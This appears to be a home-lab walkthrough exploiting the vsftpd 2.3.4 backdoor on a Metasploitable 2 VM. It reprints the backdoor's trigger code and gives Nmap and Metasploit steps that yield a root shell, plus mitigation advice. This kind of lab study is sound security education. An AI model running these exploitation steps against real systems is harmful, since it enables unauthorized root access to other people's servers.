# 🛡️ Cybersecurity Home Lab Walkthrough

## 📌 Project Overview
This repository documents a local laboratory environment dedicated to practicing penetration testing methodologies on intentionally vulnerable assets. The first module focuses on the historic **vsftpd 2.3.4 backdoor vulnerability (CVE-2011-2523)** to study how supply-chain attacks manifest in application code and how security practitioners detect and validate them.

### 🧬 The Backdoor Mechanism (Under the Hood)
In 2011, the source code archive for `vsftpd-2.3.4.tar.gz` was maliciously altered on its master distribution server. The inserted backdoor monitors incoming FTP traffic on Port 21 for a specific signature.

Below is the conceptual logic of the backdoored C code:
```c
// Malicious logic inserted into the string handling functions
if ((p = strchr(name, ':')) != NULL && *(p+1) == ')') {
    vsf_sysutil_extra_port();
}
```
* **The Trigger:** When a user logs in, the code checks if the username string contains a colon (`:`).
* **The Conditional:** It verifies if the next character is a closing parenthesis (`)`), together creating a smiley face `:)`.
* **The Payload:** If detected, authentication is bypassed, and the application forks a root shell (`/bin/sh`) listening silently on **Port 6200**.

---

## 🛠️ Lab Environment Setup
* **Attacker Machine:** Kali Linux
* **Target Machine:** Metasploitable 2 (IP: `192.168.124.129`)
* **Network Configuration:** Host-Only / Isolated NAT Network

---

## 🚀 Execution Steps

### 1. Host Verification & Reconnaissance
Verify network connectivity to the target asset using an ICMP ping, followed by a targeted version scan using Nmap to identify the running services.

```bash
# Verify network connectivity
ping -c 3 192.168.124.129

# Enumerate service versions on the target host
nmap -sV 192.168.124.129
```
*Observation: The Nmap output confirms Port 21 is open and running the target software version.*

### 2. Exploitation via Metasploit Framework
Using the Metasploit Framework console, we search for and load the specific module developed to target this backdoor configuration.

```msf
# Launch the Metasploit console
msfconsole

# Locate the appropriate exploit module
search vsftpd 2.3.4

# Load the module
use exploit/unix/ftp/vsftpd_234_backdoor

# Review the required variables
show options

# Configure the target IP address
set RHOST 192.168.124.129

# Execute the payload
exploit
```

### 3. Post-Exploitation Enumeration
Once the shell session is successfully established on the hidden port (6200), run core system commands to verify root-level context and map the host architecture.

```bash
# Verify current user context (Expected output: root)
whoami

# View user/group ID details
id

# Print system information and kernel architecture
uname -a

# Identify the host system name
hostname
```

---

## 🛡️ Mitigation & Remediation
To secure a deployment against this legacy vector:
1. **Upgrade:** Ensure the `vsftpd` service is updated to a clean version (2.3.5 or later).
2. **Network Filtering:** Restrict ingress network access to FTP ports and strictly log or block attempts to access unexpected high-range ports like port `6200`.
3. **Integrity Checking:** Verify the MD5/SHA256 hashes of downloaded software packages against trusted, official vendor manifests.

---
*Disclaimer: This walkthrough is intended solely for educational purposes and authorized penetration testing labs. Unauthorized scanning or exploitation of target systems is strictly illegal.*
